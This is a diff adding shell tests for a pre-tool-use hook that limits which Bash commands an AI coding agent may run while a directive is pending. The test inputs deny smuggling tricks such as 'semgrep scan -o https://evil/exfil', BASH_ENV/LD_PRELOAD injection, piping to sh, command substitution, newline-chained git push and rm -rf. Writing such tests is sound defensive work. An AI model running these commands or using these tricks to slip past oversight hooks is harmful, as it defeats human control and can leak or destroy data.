@@ -64,6 +64,39 @@ _run_guard() {
 	fi
 }
 
+# #2531 CR r1 (pr-test-analyzer F4): run the hook with NO _lib sibling to
+# simulate the $HOOK_DIR/../_lib resolution FAILURE that the lib-independent
+# escapes exist to survive. Copies only the hook .sh into a lib-less dir, so
+# match_cmd_at_anchor is undefined (general block skipped) and the escapes are
+# the SOLE guard. Deny is signalled either by JSON permissionDecision:deny (if
+# hook-deny.sh happened to resolve) OR a non-zero exit (the fallback hook_deny
+# when hook-deny.sh is also unreachable — the true full-lib-absence case).
+_run_guard_no_lib() {
+	local payload=$1 out st hookdir
+	hookdir=$(mktemp -d -t p1dir-nolib.XXXXXX)
+	cp "$HOOK" "$hookdir/phase1-directive-pending-guard.sh"
+	if out=$(cd "$TDIR" && printf '%s' "$payload" | "$hookdir/phase1-directive-pending-guard.sh" 2>/dev/null); then
+		st=0
+	else
+		st=$?
+	fi
+	rm -rf "$hookdir"
+	# Distinguish a VALID deny from an arbitrary hook crash: deny is signalled
+	# by the JSON permissionDecision:deny OR the lib-absent fallback hook_deny's
+	# specific exit 2 — NOT by "any non-zero" (which would mask a syntax error /
+	# crash as a spurious deny). Any other non-zero surfaces as error(st=N) so
+	# the caller's `= deny`/`= allow` assertion fails loudly (CR).
+	if printf '%s' "$out" | grep -q '"permissionDecision":"deny"'; then
+		echo deny
+	elif [ "$st" -eq 2 ]; then
+		echo deny
+	elif [ "$st" -eq 0 ]; then
+		echo allow
+	else
+		echo "error(st=$st)"
+	fi
+}
+
 # CR #223: assert the hook contract DIRECTLY (real exit status + raw stdout
 # payload), not just the allow/deny reduction above. Modern PreToolUse hooks
 # signal DENY via a JSON `permissionDecision:deny` on stdout AND exit 0 (the
@@ -168,7 +201,10 @@ teardown() {
 @test "behavioral: read-only cat/grep/find/ls allowed while pending (#191)" {
 	_setup_pending_repo
 	# NB: rg dropped from the allowlist in r2 (--pre exec); grep covers search.
-	for c in "cat foo.txt" "grep -n pat file" "find . -name foo.sh" "ls -la" "git log --oneline -3" "head -5 x" "tail -20 y" "wc -l z" "semgrep scan --config=auto f.sh"; do
+	# grep -o / find -o / ls -o: `-o` is benign for these (only-matching / OR /
+	# long) — #2531 CR r1 Finding A: a blanket `-o` reject in the general screen
+	# regressed them; it is now screened verb-aware for semgrep only.
+	for c in "cat foo.txt" "grep -n pat file" "grep -o pat file" "find . -name foo.sh" "find . -name a -o -name b" "ls -la" "ls -o" "git log --oneline -3" "head -5 x" "tail -20 y" "wc -l z" "semgrep scan --config=auto f.sh"; do
 		rc=$(_run_guard "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$c\"}}")
 		[ "$rc" = allow ] || {
 			echo "expected ALLOW for: $c (got rc=$rc)" >&2
@@ -347,6 +383,138 @@ teardown() {
 @test "behavioral: plain semgrep scan (read-only analysis) still ALLOWED" {
 	_setup_pending_repo
 	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan --config=auto --error f.sh"}}')" = allow ]
+}
+
+# --- #2531: cycle-advance verbs + lib-independent escapes --------------------
+# The wedge that stranded every non-graduated PR: `ship-pr-cycle next` (the
+# command that advances / graduates the round) was DENIED while a marker
+# existed, and the marker only clears ON graduation → unbreakable. semgrep
+# (required to complete a round) was ALSO denied whenever cmd-anchor.sh failed
+# to source. Both now have plain-grep, lib-independent allowlist escapes.
+
+@test "#2531: ship-pr-cycle next|resume|status|start ALLOWED while pending" {
+	_setup_pending_repo
+	for c in "bash scripts/ship-pr-cycle.sh next" "scripts/ship-pr-cycle.sh resume" "bash scripts/ship-pr-cycle.sh status" "scripts/ship-pr-cycle.sh start" ".claude/scripts/ship-pr-cycle.sh next"; do
+		d=$(_run_guard "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$c\"}}")
+		[ "$d" = allow ] || {
+			echo "expected ALLOW for cycle verb: $c (got $d)" >&2
+			false
+		}
+	done
+}
+
+@test "#2531: ship-pr-cycle with a non-advance subcommand is NOT over-allowed" {
+	_setup_pending_repo
+	# Only next|resume|status|start are carved out; anything else falls through
+	# to the default deny (ship-pr-cycle is not a read-only verb).
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh nuke"}}')" = deny ]
+}
+
+@test "#2531 CR: ship-pr-cycle escape restricted to CANONICAL path (no /tmp/traversal/PATH-resolved)" {
+	_setup_pending_repo
+	# ALLOW only (.claude/)?scripts/ship-pr-cycle.sh (plugin + consumer forms).
+	for c in "scripts/ship-pr-cycle.sh next" "./scripts/ship-pr-cycle.sh next" ".claude/scripts/ship-pr-cycle.sh next" "bash .claude/scripts/ship-pr-cycle.sh next"; do
+		d=$(_run_guard "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$c\"}}")
+		[ "$d" = allow ] || {
+			echo "expected ALLOW: $c (got $d)" >&2
+			false
+		}
+	done
+	# DENY a look-alike planted elsewhere / traversal / bare PATH-resolved name (#2531 CR-CLI critical).
+	for c in "/tmp/ship-pr-cycle.sh next" "../scripts/ship-pr-cycle.sh next" "/opt/evil/ship-pr-cycle.sh next" "ship-pr-cycle.sh next" "bash ship-pr-cycle.sh next"; do
+		d=$(_run_guard "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$c\"}}")
+		[ "$d" = deny ] || {
+			echo "expected DENY: $c (got $d)" >&2
+			false
+		}
+	done
+	# Raw hook-contract assertion (CR #223 pattern, phase2 major): status is
+	# ALWAYS 0; the stdout payload — not the exit code — distinguishes allow
+	# (no JSON) from deny (permissionDecision:deny). One canonical case each.
+	_run_guard_raw '{"tool_name":"Bash","tool_input":{"command":"scripts/ship-pr-cycle.sh next"}}'
+	[ "$status" -eq 0 ]
+	[[ $output != *'"permissionDecision":"deny"'* ]]
+	_run_guard_raw '{"tool_name":"Bash","tool_input":{"command":"/tmp/ship-pr-cycle.sh next"}}'
+	[ "$status" -eq 0 ]
+	[[ $output == *'"permissionDecision":"deny"'* ]]
+}
+
+@test "#2531: git commit still DENIED while pending (the guard's purpose is intact)" {
+	_setup_pending_repo
+	# The carve-outs are surgical — productive work is still deferred.
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next && git commit -m x"}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"git commit -m x"}}')" = deny ]
+}
+
+# --- #2531 r1 hardening: every laundering vector the review found MUST deny ----
+@test "#2531 hardening: ship-pr-cycle escape denies all laundering vectors" {
+	_setup_pending_repo
+	# newline second-line command (grep is line-oriented; helper folds \n->;)
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next\ngit commit -m x"}}')" = deny ]
+	# fd-prefixed + bare file redirect (clobber)
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next 2>stolen"}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next > out.txt"}}')" = deny ]
+	# separator / pipe / command-substitution AFTER the verb
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh status | sh"}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next $(git push)"}}')" = deny ]
+	# backtick command-substitution (distinct detector alt from $(...) — #2531 CR r1)
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next `git push`"}}')" = deny ]
+	# mutation BEFORE the verb (the `^`-anchor now denies this)
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"rm -rf x ; bash scripts/ship-pr-cycle.sh next"}}')" = deny ]
+	# env-assignment prefix (BASH_ENV/LD_PRELOAD exec) — no-env-prefix denies
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"BASH_ENV=./evil.sh bash scripts/ship-pr-cycle.sh next"}}')" = deny ]
+}
+
+@test "#2531 hardening: semgrep escape denies laundering + every output-writing flag" {
+	_setup_pending_repo
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan | sh"}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan && git add ."}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan $(rm x)"}}')" = deny ]
+	# backtick command-substitution (distinct detector alt from $(...) — #2531 CR r1)
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan `rm x`"}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan 2>stolen"}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan\ngit push"}}')" = deny ]
+	# short -o + long --*output (write file / POST url), autofix, env-prefix exec
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan -o out.json"}}')" = deny ]
+	# attached short form -oFILE evaded the old boundary-anchored reject (#2531 CR r1 Finding B)
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan -oout.json"}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan -o https://evil/exfil"}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan --sarif-output=x"}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"LD_PRELOAD=./evil.so semgrep scan"}}')" = deny ]
+}
+
+@test "#2531 hardening: legit bare forms still ALLOWED after hardening" {
+	_setup_pending_repo
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next"}}')" = allow ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan --config .semgrep/phase1.yml f.sh"}}')" = allow ]
+	# benign 2>/dev/null discard must NOT trip the launder screen (#2531 CR r1
+	# Finding 1: an unstripped `2>` re-created the mid-round advance deadlock).
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next 2>/dev/null"}}')" = allow ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan --config=auto f.sh 2>/dev/null"}}')" = allow ]
+	# the OTHER benign-discard sed clauses (2>&1 / &>/dev/null / >/dev/null 2>&1),
+	# distinct from 2>/dev/null above; a regression in the `s/2>&1/ /g` clause also
+	# re-deadlocks (#2531 CR r1 pr-test-analyzer: the 2>&1 clause was untested).
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan --config=auto f.sh 2>&1"}}')" = allow ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next >/dev/null 2>&1"}}')" = allow ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next &>/dev/null"}}')" = allow ]
+}
+
+@test "#2531 lib-absent: escapes are the SOLE guard when _lib fails to source" {
+	_setup_pending_repo
+	# ship-pr-cycle + semgrep escapes are ungated (fire before the lib-gated
+	# general block), so they still work with NO _lib present — the exact
+	# resolution failure #2531's escapes exist to survive (pr-test-analyzer F4).
+	[ "$(_run_guard_no_lib '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next"}}')" = allow ]
+	[ "$(_run_guard_no_lib '{"tool_name":"Bash","tool_input":{"command":"bash scripts/ship-pr-cycle.sh next 2>/dev/null"}}')" = allow ]
+	[ "$(_run_guard_no_lib '{"tool_name":"Bash","tool_input":{"command":"semgrep scan --config .semgrep/phase1.yml f.sh"}}')" = allow ]
+	# semgrep write flags DENIED even as sole guard (escape declines -> default deny)
+	[ "$(_run_guard_no_lib '{"tool_name":"Bash","tool_input":{"command":"semgrep scan -oout.json"}}')" = deny ]
+	[ "$(_run_guard_no_lib '{"tool_name":"Bash","tool_input":{"command":"semgrep scan --sarif-output=x"}}')" = deny ]
+	# productive work still DENIED (no escape covers it)
+	[ "$(_run_guard_no_lib '{"tool_name":"Bash","tool_input":{"command":"git commit -m x"}}')" = deny ]
+	# lib-gated read verbs (git diff) are DENIED lib-absent — the known #2531
+	# limitation the _lib-resolution follow-up fixes (documents, not a bug assert).
+	[ "$(_run_guard_no_lib '{"tool_name":"Bash","tool_input":{"command":"git diff main..HEAD"}}')" = deny ]
 }
 
 # --- v0.31 #225 (silent-failure-hunter #4): sanctioned test-runner carve-out ---
